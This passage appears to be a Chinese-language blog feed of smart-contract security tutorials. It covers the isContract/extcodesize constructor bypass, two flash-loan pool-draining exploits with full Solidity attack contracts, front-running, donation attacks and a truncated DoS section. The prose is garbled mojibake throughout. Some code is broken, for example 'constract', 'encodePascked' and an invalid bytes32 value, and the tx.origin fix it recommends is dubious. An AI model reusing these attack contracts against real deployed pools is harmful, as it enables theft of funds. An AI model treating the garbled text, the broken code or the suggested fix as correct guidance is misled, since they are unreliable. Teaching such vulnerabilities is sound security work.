falseï¼Œä»è€Œå…è®¸æ”»å‡»è€…ç»•è¿‡è¿™ä¸€å±‚ä¿æŠ¤å¹¶è°ƒç”¨å—ä¿æŠ¤çš„å‡½æ•°ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨æ¼”ç¤º"><a href="#æ¼æ´åˆ©ç”¨æ¼”ç¤º" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¼”ç¤º"></a>æ¼æ´åˆ©ç”¨æ¼”ç¤º</h3><p>Targetåˆçº¦æœ‰ä¸€ä¸ªçŠ¶æ€å˜é‡pwned,åˆå§‹è®¾ç½®ä¸ºfalse,è¯¥åˆçº¦çš„è®¾è®¡åˆè¡·æ˜¯åªå…è®¸å¤–éƒ¨è´¦æˆ·ä¿®æ”¹å…¶å€¼ï¼Œè€Œä¸å…è®¸åˆçº¦è´¦æˆ·ä¿®æ”¹ï¼Œå®ƒé€šè¿‡isContractå‡½æ•°å®ç°è€…ä¸€ç‚¹ï¼Œè¯¥å‡½æ•°ä¾èµ–äºextaodesizeçš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line"></span><br><span class="line">contract Target &#123;</span><br><span class="line">    function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">        // This method relies on extcodesize, which returns 0 for contracts in</span><br><span class="line">        // construction, since the code is only stored at the end of the</span><br><span class="line">        // constructor execution.</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(account)</span><br><span class="line">        &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool public pwned = false;</span><br><span class="line"></span><br><span class="line">    function protected() external &#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;no contract allowed&quot;);</span><br><span class="line">        pwned = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹pwnedçš„å€¼ï¼Œä½¿ç”¨ä»¥ä¸‹ä»£ç æ˜¯ä¸èƒ½æ”»å‡»æˆåŠŸçš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract FailedAttack &#123;</span><br><span class="line">    // Attempting to call Target.protected will fail,</span><br><span class="line">    // Target blocks calls from contracts</span><br><span class="line">    function pwn(address _target) external &#123;</span><br><span class="line">        // This will fail</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºTargetåˆçº¦åªå…è®¸å¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰è°ƒç”¨ï¼Œè€Œæˆ‘ä»¬çš„æ”»å‡»åˆçº¦æ˜¯ä¸èƒ½ä¿®æ”¹çš„</p><p>å¦‚æœæˆ‘ä»¬åœ¨æ„é€ å‡½æ•°ä¸­è°ƒç”¨ï¼Œå…¶å°±ä¼šç»•è¿‡isContractçš„æ£€æŸ¥ï¼Œæ”»å‡»ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    bool public isContract;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    // When contract is being created, code size (extcodesize) is 0.</span><br><span class="line">    // This will bypass the isContract() check</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        isContract = Target(_target).isContract(address(this));</span><br><span class="line">        addr = address(this);</span><br><span class="line">        // This will work</span><br><span class="line">        Target(_target).protected();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¢„é˜²æªæ–½"><a href="#é¢„é˜²æªæ–½" class="headerlink" title="é¢„é˜²æªæ–½"></a>é¢„é˜²æªæ–½</h3><p>ä¸ºäº†ä¿®å¤æ­¤æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ä¾èµ–extcodesizeæ¥æ‰§è¡Œæ£€æŸ¥ï¼Œè€Œæ˜¯ç›´æ¥æ¯”è¾ƒtx.originå’Œmsg.senderæ˜¯å¦ç›¸åŒã€‚ç”±äºtx.originå§‹ç»ˆæŒ‡å‘æœ€åˆå‘èµ·äº¤æ˜“çš„ EOA åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æœ‰æ•ˆåŒºåˆ†åˆçº¦å’Œ EOA è°ƒç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isContract(address account) public view returns (bool) &#123;</span><br><span class="line">    require(tx.origin == msg.sender);</span><br><span class="line">    return account.code.length &gt; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é—ªç”µè´·æ”»å‡»"><a href="#é—ªç”µè´·æ”»å‡»" class="headerlink" title="é—ªç”µè´·æ”»å‡»"></a>é—ªç”µè´·æ”»å‡»</h2><h3 id="é—ªç”µè´·è´·æ¬¾äººæ¼æ´1"><a href="#é—ªç”µè´·è´·æ¬¾äººæ¼æ´1" class="headerlink" title="é—ªç”µè´·è´·æ¬¾äººæ¼æ´1"></a>é—ªç”µè´·è´·æ¬¾äººæ¼æ´1</h3><p> MyTokenæ˜¯æ ‡å‡†çš„ ERC20 ä»£å¸ï¼Œä½œä¸ºLenderPoolå†…å¯ä¾›å€Ÿè´·çš„èµ„äº§ã€‚</p><p> LenderPoolåˆçº¦å…è®¸ç”¨æˆ·æ‰§è¡Œé—ªç”µè´·äº¤æ˜“ï¼Œå…¶flashLoanå‡½æ•°æ¥å—ç”¨æˆ·è¯·æ±‚ï¼Œå€Ÿå‡ºä¸€å®šæ•°é‡çš„ä»£å¸ï¼Œè°ƒç”¨ç›®æ ‡åˆçº¦ä¸Šçš„ç‰¹å®šæ“ä½œï¼Œå¹¶å¿è¿˜è´·æ¬¾ã€‚åœ¨å‡½æ•°çš„æœ€åï¼Œå®ƒä¼šéªŒè¯å¿è¿˜åçš„ä½™é¢æ˜¯å¦å¤§äºå¿è¿˜å‰çš„ä½™é¢ã€‚é€šå¸¸ï¼Œå¿è¿˜é‡‘é¢åŒ…æ‹¬æœ¬é‡‘å’Œåˆ©æ¯ã€‚å› æ­¤ï¼Œåœ¨å‘èµ·è´·æ¬¾åï¼Œæ± å­çš„ä½™é¢åº”è¯¥å¢åŠ ã€‚å¦åˆ™ï¼Œè´·æ¬¾äº¤æ˜“å¤±è´¥ã€‚</p><p> è¯¥åˆçº¦çš„æ¼æ´åœ¨äºç›®æ ‡åˆçº¦çš„ä½ä»£ç è°ƒç”¨ã€‚ç”±äºè¿™é‡Œæ²¡æœ‰ä»»ä½•éªŒè¯æœºåˆ¶ï¼Œå¹¶ä¸”è°ƒç”¨å‡½æ•°æä¾›äº†å¹¿æ³›çš„æ“ä½œèƒ½åŠ›ï¼Œä¾‹å¦‚è·å–LenderPoolä¸­MyTokenä»£å¸çš„æˆæƒï¼Œå› æ­¤å¯ä»¥ä»æ± ä¸­æŠ½å–æ‰€æœ‰èµ„äº§ã€‚<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract LenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    MyToken public token;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    constructor(MyToken _token) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external nonReentrant returns (bool) &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line">        bool ret = token.transfer(borrower, amount);</span><br><span class="line"></span><br><span class="line">        // it&#x27;s dangerous</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        if (token.balanceOf(address(this)) &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyToken is ERC20, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;MyToken&quot;, &quot;MTK&quot;) Ownable(msg.sender) &#123;</span><br><span class="line">        _mint(msg.sender, 10000 * 10**decimals());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨<strong>Attackåˆçº¦</strong>çš„æ”»å‡»å‡½æ•°ä¸­ï¼Œæ”»å‡»è€…ä»æ± åˆçº¦å‘èµ·ä¸€æ¬¡é—ªç”µè´·ï¼Œå€Ÿå…¥ 0 ä¸ªä»£å¸ï¼Œå› ä¸ºæ­¤æ—¶ä»–ä»¬ä¸éœ€è¦è¿™äº›ä»£å¸ã€‚ç›¸åï¼Œä»–ä»¬æ„é€  calldataä»¥è·å¾—<strong>LenderPool</strong>çš„æ‰¹å‡†ã€‚ä¸€æ—¦<strong>flashLoan</strong>å‡½æ•°æˆåŠŸæ‰§è¡Œï¼Œä»–ä»¬å°±ä¼šè·å¾—æˆæƒå¹¶æ‰§è¡Œ<strong>transferFrom</strong>æ“ä½œå°†ä»£å¸è½¬ç§»åˆ°è‡ªå·±çš„åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    LenderPool pool;</span><br><span class="line">    MyToken token;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool, address _token) &#123;</span><br><span class="line">        pool = LenderPool(_pool);</span><br><span class="line">        token = MyToken(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()</span><br><span class="line">        public</span><br><span class="line">        returns (uint256 before_balance, uint256 after_balance)</span><br><span class="line">    &#123;</span><br><span class="line">        before_balance = token.balanceOf(address(this));</span><br><span class="line">        bytes memory _calldata = abi.encodeWithSignature(</span><br><span class="line">            &quot;approve(address,uint256)&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            10000</span><br><span class="line">        );</span><br><span class="line">        pool.flashLoan(0, address(this), address(token), _calldata);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        token.transferFrom(address(pool), address(this), 10000);</span><br><span class="line">        after_balance = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é—ªç”µè´·è´·æ¬¾äººæ¼æ´2"><a href="#é—ªç”µè´·è´·æ¬¾äººæ¼æ´2" class="headerlink" title="é—ªç”µè´·è´·æ¬¾äººæ¼æ´2"></a>é—ªç”µè´·è´·æ¬¾äººæ¼æ´2</h3><p>è¿™æ˜¯ä¸€ä¸ªå…·æœ‰æ¼æ´çš„åˆçº¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EthLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å­˜æ¬¾å’Œå–æ¬¾å‡½æ•°ç”¨äºå­˜å…¥å’Œæå– ETHï¼Œç”¨æˆ· ETH ä½™é¢è®°å½•åœ¨åˆçº¦çš„ä½™é¢çŠ¶æ€å˜é‡ä¸­ã€‚</li><li>flashLoanå‡½æ•°ç”¨äºå€Ÿå‡ºèµ„é‡‘ã€‚åœ¨è¿™é‡Œï¼Œå€Ÿæ¬¾äººå¿…é¡»å®ç°IFlashLoanEtherReceiveræ¥å£ã€‚å½“èµ„é‡‘å‘é€åˆ°å€Ÿæ¬¾äººåˆçº¦æ—¶ï¼Œè¿˜ä¼šè°ƒç”¨æ¥å£ä¸­å®šä¹‰çš„å›è°ƒå‡½æ•°execute ï¼Œå…è®¸å€Ÿæ¬¾äººæ‰§è¡Œè‡ªå®šä¹‰ä¸šåŠ¡é€»è¾‘ã€‚ä½†æ˜¯ï¼Œå¿…é¡»ç¡®ä¿å€Ÿå…¥çš„èµ„é‡‘å¿è¿˜ç»™è´·æ–¹æ± ï¼Œä»¥ä¿æŒä½™é¢å¤§äºæˆ–ç­‰äºåŸå§‹ä½™é¢ã€‚å¦åˆ™å°†å¯¼è‡´å€Ÿè´·å¤±è´¥ã€‚<blockquote><p>é£é™©ï¼šåªæ£€æŸ¥è¿˜æ¬¾åçš„ä½™é¢å¤§å°ã€‚ä½†è¿™ä¸ªä½™é¢å¯èƒ½åŒ…æ‹¬ç”¨æˆ·åœ¨åˆçº¦ä¸­æŒæœ‰çš„èµ„äº§ï¼Œç”¨æˆ·å¯ä»¥éšæ—¶æå–è¿™äº›èµ„äº§ã€‚</p></blockquote></li></ul><p>ä»¥ä¸‹æ˜¯æ”»å‡»è€…åˆçº¦ï¼Œåœ¨æ‰§è¡Œå›è°ƒå‡½æ•°ä¸­ï¼Œæ”»å‡»è€…å°†å€Ÿå…¥çš„èµ„é‡‘å­˜å›æ± ä¸­ï¼Œç¡®ä¿æ± å­çš„ä½™é¢ä¸ä¼šå‡å°‘ï¼Œä½†è¿™äº›èµ„é‡‘ç°åœ¨è¢«è®°å½•ä¸ºæ”»å‡»è€…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack is IFlashLoanEtherReceiver&#123;</span><br><span class="line">    EthLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = EthLenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æŠ¢è·‘äº¤æ˜“"><a href="#æŠ¢è·‘äº¤æ˜“" class="headerlink" title="æŠ¢è·‘äº¤æ˜“"></a>æŠ¢è·‘äº¤æ˜“</h2><p>å®ƒçš„æœ¬è´¨å°±æ˜¯åˆ©ç”¨äº†äº¤æ˜“é¡ºåºè¿›è¡Œè·åˆ©</p><p>å…ˆè¯´ä»¥ä¸‹å†…æ¶µï¼Œé€šä¿—æ¥è®²ï¼Œå°±æ˜¯è¢«äººæ¯”ä½ å¿«ä¸€æ­¥ï¼Œå› ä¸ºåœ¨åŒºå—é“¾ä¸Šçš„äº¤æ˜“éƒ½æ˜¯å…¬å¼€é€æ˜çš„ï¼Œå°±æ˜¯èƒ½å¤Ÿè·å–å…¶ä»–äººçš„äº¤æ˜“ï¼Œæ”»å‡»è€…å‘ç°äº†ä½ çš„äº¤æ˜“ä¿¡æ¯ï¼Œç„¶åä»–æ”¯å‡ºæ›´é«˜çš„gasè´¹ç”¨ï¼Œåœ¨ä½ ä¹‹å‰è¿›è¡Œäº¤æ˜“ï¼Œå°±ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜å‡ºç°</p><blockquote><p>åœ¨ä»¥å¤ªåŠäº¤æ˜“ä¸­ï¼Œå½“ä½ å‘èµ·ä¸€ä¸ªäº¤æ˜“æ—¶ï¼Œé¦–å…ˆä¼šè¿›è¡Œæ‰“åŒ…è¿›å…¥äº¤æ˜“æ± ï¼Œç„¶åçŸ¿å·¥æ¥å¤„ç†è¿™äº›äº¤æ˜“ï¼Œå½“ç„¶ï¼Œä¼˜å…ˆå¤„ç†gasè´¹æ›´é«˜çš„äº¤æ˜“<br>ä¸¾ä¾‹ï¼šè¿™æ˜¯ä¸€ä¸ªçŒœè°œæ¸¸æˆï¼ŒçŒœå¯¹å³å¯è·å¾—10ä¸ªehter</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^0.8.17;</span><br><span class="line"></span><br><span class="line">constract FindThisHash&#123;</span><br><span class="line">    bytes32 public constant hash = 111111;</span><br><span class="line"></span><br><span class="line">    constructor () payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve (string memory solution) public&#123;</span><br><span class="line">        require(hash == keccak256(abi.encodePascked(solution)),&quot;Incorrect answer&quot;);</span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;valueï¼š10 ehter&#125;(&quot;&quot;);</span><br><span class="line">        require(sent,&quot;Failed to send Ehter&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AçŒœä¸­äº†ç­”æ¡ˆï¼Œè°ƒç”¨äº†solveå‡½æ•°è¾“å…¥æ­£ç¡®çš„ç­”æ¡ˆæ­¤æ—¶çš„gasçš„ä»·æ ¼è®¾ç½®ä¸º15gweiï¼Œç„¶åæœ‰ä¸ªäººåœ¨äº¤æ˜“æ± å‘ç°äº†è¿™ä¸ªï¼ŒBå°±è·å–äº†Açš„ç­”æ¡ˆï¼Œä»–åˆç”¨æ¯”15gweié«˜çš„ä»·æ ¼è°ƒç”¨solveå‡½æ•°ï¼Œç„¶åçŸ¿å·¥å°±ä¼šå…ˆå¤„ç†Bçš„äº¤æ˜“ï¼Œæœ€åBè·å¾—äº†10ä»¥å¤ªå¸çš„å¥–åŠ±</p><h3 id="é¢„é˜²æªæ–½-1"><a href="#é¢„é˜²æªæ–½-1" class="headerlink" title="é¢„é˜²æªæ–½"></a>é¢„é˜²æªæ–½</h3><p>é‡‡ç”¨ Commit-Reveal çš„æ¨¡å¼ï¼Œè¯¥æ–¹æ¡ˆæœ‰ä¸¤ä¸ªé˜¶æ®µï¼šCommit é˜¶æ®µï¼Œæäº¤ç‰¹å®šçš„å€¼ï¼ˆæ¯”å¦‚åŒ…å«ç­”æ¡ˆçš„ Hash å€¼ï¼Œç­”æ¡ˆå¹¶æ²¡æœ‰ç›´æ¥æš´éœ²å‡ºæ¥ï¼‰ï¼›ä»¥åŠ Reveal é˜¶æ®µï¼Œå…¶ä¸­æ­ç¤ºå¹¶æ£€æŸ¥å€¼ï¼ˆæ ¡éªŒç­”æ¡ˆæ˜¯å¦æ­£ç¡®ï¼‰ã€‚</p><p>ä¸ºäº†æ›´å¥½åœ°ç†è§£ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå‘é€è€… Alice å°†ä¸€æ¡æ¶ˆæ¯æ”¾å…¥ä¸€ä¸ªä¸Šé”çš„ç›’å­ä¸­ï¼Œç„¶åå°†å…¶äº¤ç»™æ¥æ”¶è€… Bobã€‚Bob ä»¥åŠå…¶ä»–ä»»ä½•äººæ— æ³•è®¿é—®è¯¥æ¶ˆæ¯ï¼Œå› ä¸ºå®ƒè¢«é”åœ¨ç›’å­é‡Œï¼Œä½†æ˜¯å½“ Alice æƒ³è¦é€éœ²è¯¥æ¶ˆæ¯æ—¶ï¼Œå¥¹å¯ä»¥è§£é”ç›’å­å¹¶å°†è¯¥æ¶ˆæ¯æ˜¾ç¤ºç»™ Bobã€‚</p><h2 id="ç­¾åé‡æ”¾æ”»å‡»"><a href="#ç­¾åé‡æ”¾æ”»å‡»" class="headerlink" title="ç­¾åé‡æ”¾æ”»å‡»"></a>ç­¾åé‡æ”¾æ”»å‡»</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æŠ¢å…ˆäº¤æ˜“æ”»å‡»</title>
      <link href="/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="æŠ¢å…ˆäº¤æ˜“æ”»å‡»"><a href="#æŠ¢å…ˆäº¤æ˜“æ”»å‡»" class="headerlink" title="æŠ¢å…ˆäº¤æ˜“æ”»å‡»"></a>æŠ¢å…ˆäº¤æ˜“æ”»å‡»</h2><h3 id="æ˜¯å¦æœ‰æªæ–½é˜²æ­¢æˆ–åˆ›å»ºæ¨¡å¼ä¸­çš„æŠ¢å…ˆäº¤æ˜“æ¼æ´"><a href="#æ˜¯å¦æœ‰æªæ–½é˜²æ­¢æˆ–åˆ›å»ºæ¨¡å¼ä¸­çš„æŠ¢å…ˆäº¤æ˜“æ¼æ´" class="headerlink" title="æ˜¯å¦æœ‰æªæ–½é˜²æ­¢æˆ–åˆ›å»ºæ¨¡å¼ä¸­çš„æŠ¢å…ˆäº¤æ˜“æ¼æ´"></a>æ˜¯å¦æœ‰æªæ–½é˜²æ­¢æˆ–åˆ›å»ºæ¨¡å¼ä¸­çš„æŠ¢å…ˆäº¤æ˜“æ¼æ´</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ææ¬¾æ”»å‡»</title>
      <link href="/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="ææ¬¾æ”»å‡»"><a href="#ææ¬¾æ”»å‡»" class="headerlink" title="ææ¬¾æ”»å‡»"></a>ææ¬¾æ”»å‡»</h2><h3 id="è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡"><a href="#è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡" class="headerlink" title="è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡"></a>è¯¥åè®®æ˜¯å¦ä¾èµ–äºbalanceæˆ–è€…balanceofï¼Œè€Œä¸æ˜¯å†…éƒ¨ä¼šè®¡</h3><h4 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h4><p>   åœ¨ä»¥å¤ªåŠç½‘ç»œä¸Šï¼Œä»»ä½•åœ°å€çš„ä½™é¢ï¼ˆæ— è®ºæ˜¯ä»¥å¤ªå¸è¿˜æ˜¯ä»£å¸ï¼‰éƒ½å¯ä»¥é€šè¿‡address(this).balance æˆ–token.balanceof(address)æŸ¥è¯¢ã€‚ç„¶è€Œï¼Œå¤–éƒ¨è´¦æˆ·çš„ä½™é¢å¯ä»¥è¢«å¤–éƒ¨æ“ä½œï¼ˆå¦‚å…¶ä»–åˆçº¦è°ƒç”¨ã€ç”¨æˆ·è½¬è´¦ç­‰ï¼‰å“ã€‚ä¾èµ–äºå¤–éƒ¨çŠ¶æ€ï¼ˆå³ä½™é¢ï¼‰å¯èƒ½å¯¼è‡´åˆçº¦çš„å†…éƒ¨é€»è¾‘å¤±å»ä¸€è‡´æ€§ï¼Œå› ä¸ºå¤–éƒ¨è´¦æˆ·çš„çŠ¶æ€åœ¨åˆçº¦è¿è¡ŒæœŸé—´æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚</p><h4 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h4><p>   é¦–ä½å­˜æ¬¾äººå¯ä»¥ä¸­æ–­è‚¡ä»½çš„é”»é€ ï¼Œå¦‚æœæ€»èµ„äº§é€šè¿‡å¤§é‡ææ¬¾è¢«æ“çºµï¼Œç”¨æˆ·å¯èƒ½æ— æ³•è·å¾—å…¶å­˜æ¬¾çš„è‚¡ä»½ï¼Œæ”»å‡»è€…æ“çºµä¾èµ–äºbalanceofç¡®å®šæ€»èµ„äº§é‡‘é¢å¹¶é˜»æ­¢å…¶ä»–ç”¨æˆ·é€šè¿‡å­˜æ¬¾æ¢å–è‚¡ä»½</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDOSï¼‰</title>
      <link href="/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/"/>
      <url>/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»"><a href="#æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»" class="headerlink" title="æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»"></a>æ‹’ç»æœåŠ¡ï¼ˆDOSï¼‰æ”»å‡»</h3><h3 id="æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨"><a href="#æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨" class="headerlink" title="æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨"></a>æœªè®¾å®šgasè´¹ç‡çš„å¤–éƒ¨è°ƒç”¨</h3><p> åœ¨ä»¥å¤ªåŠä¸­ï¼Œæ¯ä¸€ç¬”äº¤æ˜“éƒ½ä¼šæºå¸¦ä¸€å®šæ•°é‡çš„Gasï¼Œè¿™æ˜¯ä¸ºäº†ç¡®ä¿ä»»ä½•æ‰§è¡Œçš„æ“ä½œéƒ½ä¸ä¼šæ¶ˆè€—è¿‡å¤šçš„è®¡ç®—èµ„æºï¼Œä»è€Œé¿å…ç½‘ç»œæ‹¥å µæˆ–èµ„æºè€—å°½ã€‚å½“ä¸€ç¬”äº¤æ˜“å¼€å§‹æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šä»äº¤æ˜“è€…æä¾›çš„Gasæ€»é‡ä¸­æ‰£é™¤è´¹ç”¨ï¼Œç›´åˆ°åˆçº¦æ‰§è¡Œå®Œæˆæˆ–Gasè€—å°½ã€‚å¦‚æœåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­Gasè€—å°½ï¼Œé‚£ä¹ˆäº¤æ˜“å°†è¢«å›æ»šï¼Œä¸”å·²ç»æ¶ˆè€—çš„Gasä¸ä¼šé€€è¿˜ç»™ç”¨æˆ·ã€‚</p><h4 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h4><p>   1ï¼Œ æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ é«˜å¤æ‚åº¦çš„äº¤æ˜“æˆ–æ™ºèƒ½åˆçº¦æ¥æ•…æ„æ¶ˆè€—å¤§é‡çš„Gasï¼Œä»è€Œæ­£å¸¸äº¤æ˜“æ— æ³•è¢«åŒ…å«åœ¨åŒºå—ä¸­ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªåˆçº¦ï¼Œè¯¥åˆçº¦åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯æ—¶æ‰§è¡Œå¤§é‡è®¡ç®—æˆ–å­˜å‚¨æ“ä½œï¼Œæ¶ˆè€—æ¥è¿‘æœ€å¤§Gasé™é¢çš„Gasé‡ã€‚å½“è®¸å¤šè¿™æ ·çš„äº¤æ˜“è¢«åŒæ—¶å‘é€åˆ°ç½‘ç»œæ—¶ï¼Œå®ƒä»¬ä¼šå 